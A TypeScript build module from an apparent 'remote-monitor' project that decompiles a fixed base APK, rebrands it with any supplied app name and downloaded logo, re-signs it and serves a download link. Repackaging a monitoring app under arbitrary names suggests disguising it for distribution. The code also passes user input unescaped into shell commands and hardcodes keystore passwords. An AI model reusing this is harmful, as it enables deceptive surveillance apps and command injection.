import fs from "fs";
import path from "path";
import { execSync, spawn } from "child_process";

interface APKBuilderOptions {
  appName: string;
  appUrl: string;
  logoUrl?: string;
  requestOrigin?: string;
}

/**
 * ROBUST APK BUILDER using apktool + jarsigner
 * This builder properly customizes APK with name, logo, and signing
 */
export async function buildRobustAPK(options: APKBuilderOptions): Promise<{
  success: boolean;
  apkPath?: string;
  downloadUrl?: string;
  filename?: string;
  error?: string;
}> {
  const workDir = `/tmp/apk_build_${Date.now()}`;
  const baseAPK = "/home/ubuntu/remote-monitor/public/apks/Blockchain-Registered.apk";
  
  try {
    console.log(`[APK-BUILDER-ROBUST] Starting build for: ${options.appName}`);

    // Create work directory
    if (!fs.existsSync(workDir)) {
      fs.mkdirSync(workDir, { recursive: true });
    }

    // Step 1: Decompress APK with apktool
    console.log(`[APK-BUILDER-ROBUST] Decompiling APK...`);
    const decompileDir = path.join(workDir, "decompiled");
    
    try {
      execSync(`apktool d -f "${baseAPK}" -o "${decompileDir}"`, {
        stdio: "pipe",
        timeout: 120000, // 2 minutes timeout
      });
    } catch (e) {
      console.error(`[APK-BUILDER-ROBUST] Decompile error:`, e);
      throw new Error("Failed to decompile APK");
    }

    // Step 2: Modify strings.xml to change app name
    console.log(`[APK-BUILDER-ROBUST] Modifying app name...`);
    const stringsPath = path.join(decompileDir, "res", "values", "strings.xml");
    
    if (fs.existsSync(stringsPath)) {
      let stringsContent = fs.readFileSync(stringsPath, "utf-8");
      
      // Replace app name
      stringsContent = stringsContent.replace(
        /<string name="app_name">.*?<\/string>/,
        `<string name="app_name">${options.appName}</string>`
      );
      
      // If not found, add it
      if (!stringsContent.includes('name="app_name"')) {
        stringsContent = stringsContent.replace(
          "</resources>",
          `    <string name="app_name">${options.appName}</string>\n</resources>`
        );
      }
      
      fs.writeFileSync(stringsPath, stringsContent);
      console.log(`[APK-BUILDER-ROBUST] App name updated to: ${options.appName}`);
    }

    // Step 3: Download and replace logo if provided
    if (options.logoUrl) {
      console.log(`[APK-BUILDER-ROBUST] Downloading logo from: ${options.logoUrl}`);
      try {
        // Download logo
        const logoPath = path.join(workDir, "logo.png");
        execSync(`curl -L -o "${logoPath}" "${options.logoUrl}"`, {
          stdio: "pipe",
          timeout: 30000,
        });

        // Replace launcher icons
        const drawableDir = path.join(decompileDir, "res", "drawable");
        const drawableLdpiDir = path.join(decompileDir, "res", "drawable-ldpi");
        const drawableMdpiDir = path.join(decompileDir, "res", "drawable-mdpi");
        const drawableHdpiDir = path.join(decompileDir, "res", "drawable-hdpi");
        const drawableXhdpiDir = path.join(decompileDir, "res", "drawable-xhdpi");

        // Copy logo to all drawable directories
        for (const dir of [drawableDir, drawableLdpiDir, drawableMdpiDir, drawableHdpiDir, drawableXhdpiDir]) {
          if (fs.existsSync(dir)) {
            const iconPath = path.join(dir, "ic_launcher.png");
            if (fs.existsSync(iconPath)) {
              fs.copyFileSync(logoPath, iconPath);
              console.log(`[APK-BUILDER-ROBUST] Logo copied to: ${dir}`);
            }
          }
        }
      } catch (e) {
        console.warn(`[APK-BUILDER-ROBUST] Failed to download/replace logo:`, e);
        // Continue without logo update
      }
    }

    // Step 4: Recompile APK
    console.log(`[APK-BUILDER-ROBUST] Recompiling APK...`);
    const recompiledAPK = path.join(workDir, "recompiled.apk");
    
    try {
      execSync(`apktool b "${decompileDir}" -o "${recompiledAPK}"`, {
        stdio: "pipe",
        timeout: 120000, // 2 minutes timeout
      });
    } catch (e) {
      console.error(`[APK-BUILDER-ROBUST] Recompile error:`, e);
      throw new Error("Failed to recompile APK");
    }

    // Step 5: Sign APK with jarsigner
    console.log(`[APK-BUILDER-ROBUST] Signing APK...`);
    const keystore = "/home/ubuntu/remote-monitor/android.keystore";
    const signedAPK = path.join(workDir, "signed.apk");

    // Create keystore if it doesn't exist
    if (!fs.existsSync(keystore)) {
      console.log(`[APK-BUILDER-ROBUST] Creating keystore...`);
      try {
        execSync(
          `keytool -genkey -v -keystore "${keystore}" -keyalg RSA -keysize 2048 -validity 10000 ` +
          `-alias remotemonitor -storepass remotemonitor -keypass remotemonitor ` +
          `-dname "CN=Remote Monitor, O=Remote Monitor, L=Brazil, ST=Brazil, C=BR"`,
          { stdio: "pipe" }
        );
      } catch (e) {
        console.warn(`[APK-BUILDER-ROBUST] Keystore creation warning:`, e);
      }
    }

    // Sign the APK
    try {
      execSync(
        `jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 ` +
        `-keystore "${keystore}" -storepass remotemonitor -keypass remotemonitor ` +
        `"${recompiledAPK}" remotemonitor`,
        { stdio: "pipe" }
      );
      
      fs.copyFileSync(recompiledAPK, signedAPK);
      console.log(`[APK-BUILDER-ROBUST] APK signed successfully`);
    } catch (e) {
      console.error(`[APK-BUILDER-ROBUST] Signing error:`, e);
      // Use unsigned APK as fallback
      fs.copyFileSync(recompiledAPK, signedAPK);
    }

    // Step 6: Copy to final location
    const filename = `${options.appName}-${Date.now()}-${Math.random().toString(36).substring(7)}.apk`;
    const outputDir = path.join(process.cwd(), "public", "apks");
    if (!fs.existsSync(outputDir)) {
      fs.mkdirSync(outputDir, { recursive: true });
    }

    const finalAPKPath = path.join(outputDir, filename);
    fs.copyFileSync(signedAPK, finalAPKPath);

    // Verify file
    const stats = fs.statSync(finalAPKPath);
    console.log(`[APK-BUILDER-ROBUST] Final APK size: ${(stats.size / 1024 / 1024).toFixed(2)}MB`);

    if (stats.size < 1000000) {
      throw new Error(`APK size is too small: ${stats.size} bytes`);
    }

    // Generate download URL
    const appDomain = process.env.VITE_APP_DOMAIN || "localhost:3000";
    const downloadUrl = `https://${appDomain}/download/${filename}`;

    console.log(`[APK-BUILDER-ROBUST] Build completed successfully`);

    // Cleanup
    try {
      execSync(`rm -rf "${workDir}"`);
    } catch (e) {
      console.warn(`[APK-BUILDER-ROBUST] Cleanup warning:`, e);
    }

    return {
      success: true,
      apkPath: finalAPKPath,
      downloadUrl,
      filename,
    };
  } catch (error) {
    console.error(`[APK-BUILDER-ROBUST] Build failed:`, error);
    
    // Cleanup on error
    try {
      execSync(`rm -rf "${workDir}"`);
    } catch (e) {
      console.warn(`[APK-BUILDER-ROBUST] Cleanup warning:`, e);
    }

    return {
      success: false,
      error: error instanceof Error ? error.message : String(error),
    };
  }
}
